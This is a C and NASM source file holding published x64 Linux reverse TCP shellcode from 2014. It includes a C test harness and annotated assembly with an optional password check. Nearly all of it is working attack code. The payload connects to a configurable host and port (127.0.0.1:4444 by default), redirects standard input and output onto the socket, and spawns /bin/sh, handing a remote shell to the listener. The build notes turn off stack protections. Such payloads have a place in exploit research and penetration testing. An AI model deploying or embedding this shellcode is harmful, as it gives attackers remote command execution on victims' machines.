/*
* Author:           Sean Dillon
* Copyright:        (c) 2014 CAaNES, LLC. (http://caanes.com)
* Release Date:     December 19, 2014
*
* Description:      x64 Linux null-free reverse TCP shellcode, optional 4 byte password
* Assembled Size:   77 - 85 bytes, 90 - 98 with password
* Tested On:        Kali 1.0.9a GNU/Linux 3.14.5-kali1-amd64 x86_64
* License:          http://opensource.org/license/MIT
*
* Build/Run:        gcc -m64 -z execstack -fno-stack-protector reverseshell.c -o reverseshell.out
*                   nc -l -p 4444
*/

/*
* NOTE: This C code connects to 127.0.0.1:4444 and does not have the password option enabled.
* Because the IP 127.0.0.1 contains null-bytes, a mask has to be used, adding 8 bytes.
* The end of this file contains the .nasm source code and instructions for building from that.
*/

#include <stdio.h>
#include <string.h>

char shellcode[] =
	"\x31\xf6"                      /* xor    %esi,%esi */
	"\xf7\xe6"                      /* mul    %esi */
	"\xff\xc6"                      /* inc    %esi */
	"\x6a\x02"                      /* pushq  $0x2 */
	"\x5f"                          /* pop    %rdi */
	"\x04\x29"                      /* add    $0x29,%al */
	"\x0f\x05"                      /* syscall */
	"\x50"                          /* push   %rax */
	"\x5f"                          /* pop    %rdi */
	"\x52"                          /* push   %rdx */
	"\x52"                          /* push   %rdx */
	"\xc7\x44\x24\x04\x7d\xff\xfe"  /* movl   $0xfefeff7d,0x4(%rsp) */
	"\xfe"                          /* . */
	"\x81\x44\x24\x04\x02\x01\x01"  /* addl   $0x2010102,0x4(%rsp) */
	"\x02"                          /* . */
	"\x66\xc7\x44\x24\x02\x11\x5c"  /* movw   $0x5c11,0x2(%rsp) */
	"\xc6\x04\x24\x02"              /* movb   $0x2,(%rsp) */
	"\x54"                          /* push   %rsp */
	"\x5e"                          /* pop    %rsi */
	"\x6a\x10"                      /* pushq  $0x10 */
	"\x5a"                          /* pop    %rdx */
	"\x6a\x2a"                      /* pushq  $0x2a */
	"\x58"                          /* pop    %rax */
	"\x0f\x05"                      /* syscall */
	"\x6a\x03"                      /* pushq  $0x3 */
	"\x5e"                          /* pop    %rsi */
	"\xff\xce"                      /* dec    %esi */
	"\xb0\x21"                      /* mov    $0x21,%al */
	"\x0f\x05"                      /* syscall */
	"\x75\xf8"                      /* jne    39 <dupe_loop> */
	"\x56"                          /* push   %rsi */
	"\x5a"                          /* pop    %rdx */
	"\x56"                          /* push   %rsi */
	"\x48\xbf\x2f\x2f\x62\x69\x6e"  /* movabs $0x68732f6e69622f2f,%rdi */
	"\x2f\x73\x68"                  /* . */
	"\x57"                          /* push   %rdi */
	"\x54"                          /* push   %rsp */
	"\x5f"                          /* pop    %rdi */
	"\xb0\x3b"                      /* mov    $0x3b,%al */
	"\x0f\x05"                      /* syscall */;


main(void)
{
	printf("Shellcode length: %d\n", (int)strlen(shellcode));

	/* pollute registers and call shellcode */
	__asm__ (	 "mov $0xffffffffffffffff, %rax\n\t"
		         "mov %rax, %rbx\n\t"
		         "mov %rax, %rcx\n\t"
		         "mov %rax, %rdx\n\t"
		         "mov %rax, %rsi\n\t"
		         "mov %rax, %rdi\n\t"
		         "mov %rax, %rbp\n\t"

		         "call shellcode"	);
}


/* --------------------------------------------------------------------------------------

; Author:           Sean Dillon
; Company:          CAaNES, LLC. (http://caanes.com)
; Release Date:     December 19, 2014
;
; Description:      x64 Linux null-free reverse TCP shellcode, optional 4 byte password
; Assembled Size:   77 - 85 bytes, 90 - 98 with password
; Tested On:        Kali 1.0.9a GNU/Linux 3.14.5-kali1-amd64 x86_64
; License:          http://opensource.org/license/MIT
;
; Build/Run:        nasm -f elf64 -o reverseshell.o reverseshell.nasm
;                   ld -o reverseshell reverseshell.o
;                   objdump -d --disassembler-options=addr64 reverseshell

BITS 64
global _start
section .text

; settings
%define     USEPASSWORD     ; comment this to not require password
PASSWORD    equ 'Z~r0'      ; cmp dword (SEGFAULT on fail; no bruteforce/cracking/etc.)
IP          equ 0x0100007f  ; default 127.0.0.1, contains nulls so will need mask
PORT        equ 0x5c11      ; default 4444

; change the null-free mask as needed
%define NULLFREE_MASK   0x02010102           ; comment this out if no .0. in IP, save 8 bytes

%ifdef NULLFREE_MASK
%define NULLFREE_IP     IP - NULLFREE_MASK
%else
%define NULLFREE_IP     IP
%endif

; syscall kernel opcodes
SYS_SOCKET  equ 0x29
SYS_CONNECT equ 0x2a
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b

; argument constants
AF_INET     equ 0x2
SOCK_STREAM equ 0x1

_start:
; High level psuedo-C overview of shellcode logic:
;
; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
; IP = NULLFREE_IP + NULLFREE_MASK
; struct sockaddr = {AF_INET; [PORT; IP; 0x0]}
;
; connect(sockfd, &sockaddr, 16)
;
; read(sockfd, *pwbuf, 16)  // 16 > 4
; if (pwbuf != PASSWORD) goto drop
;
; dup2(sockfd, STDIN+STDOUT+STDERR)
; execve("/bin/sh", NULL, NULL)

create_sock:
    ; sockfd = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; syscall number 41

    xor esi, esi        ; 0 out rsi
    mul esi             ; 0 out rax, rdx

                        ; rdx = IPPROTO_IP (int: 0)

    inc esi             ; rsi = SOCK_STREAM (int: 1)

    push AF_INET        ; rdi = AF_INET (int: 2)
    pop rdi

    add al, SYS_SOCKET
    syscall

    ; copy socket descriptor to rdi for future use

    push rax
    pop rdi

struct_sockaddr:
    ; server.sin_family = AF_INET
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
    ; bzero(&server.sin_zero, 8)

    push rdx
    push rdx

    mov dword [rsp + 0x4], NULLFREE_IP

%ifdef NULLFREE_MASK
    add dword [rsp + 0x4], NULLFREE_MASK
%endif

    mov word [rsp + 0x2], PORT
    mov byte [rsp], AF_INET

connect_sock:
    ; connect(sockfd, (struct sockaddr *)&server, sockaddr_len)

    push rsp
    pop rsi

    push 0x10
    pop rdx

    push SYS_CONNECT
    pop rax
    syscall


%ifdef USEPASSWORD
password_check:
    ; password = read(sockfd, *buf, 4)

                                    ; rsi = &buf (char*)
                                    ; rdx = 0x10, >4 bytes

    xor eax, eax                    ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], PASSWORD       ; simple comparison
    jne drop                        ; bad pw, abort
%endif

dupe_sockets:
    ; dup2(sockfd, STDIN)
    ; dup2(sockfd, STDOUT)
    ; dup2(sockfd, STERR)

    push 0x3                ; loop down file descriptors for I/O
    pop rsi

dupe_loop:
    dec esi
    mov al, SYS_DUP2
    syscall

    jne dupe_loop

exec_shell:
    ; execve('//bin/sh', NULL, NULL)

    push rsi                    ; *argv[] = 0
    pop rdx                     ; *envp[] = 0

    push rsi                    ; '\0'
    mov rdi, '//bin/sh'         ; str
    push rdi
    push rsp
    pop rdi                     ; rdi = &str (char*)

    mov al, SYS_EXECVE          ; we fork with this syscall
    syscall

drop:
    ; password check failed, crash program with BADINSTR/SEGFAULT

;--------------------------------------------------------------------------------------*/